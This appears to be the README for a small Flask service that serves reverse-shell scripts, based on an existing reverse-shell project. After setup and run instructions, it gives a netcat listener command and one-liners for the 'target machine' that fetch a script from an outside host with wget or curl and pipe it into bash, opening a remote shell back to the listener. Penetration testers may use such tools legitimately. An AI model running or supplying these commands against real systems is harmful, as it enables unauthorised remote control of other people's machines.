# shells
shells, based on [reverse-shell](https://github.com/lukechilds/reverse-shell).

# run
setup python environment
```bash
pipenv install
```

virtual environment
```bash
pipenv shell
```
run app
```bash
flask run
```

or just run this, specify host and port.
```
pipenv run flask run --port 8080 --host 0.0.0.0
```

# give me a shell
Listen with netcat:
```
nc -lvp 1338
```

run this on target machine:
```
wget -qO- http://mi-ip-host:port/127.0.0.1:1338 | bash

curl http://mi-ip-host:port/127.0.0.1:1338 | bash
```
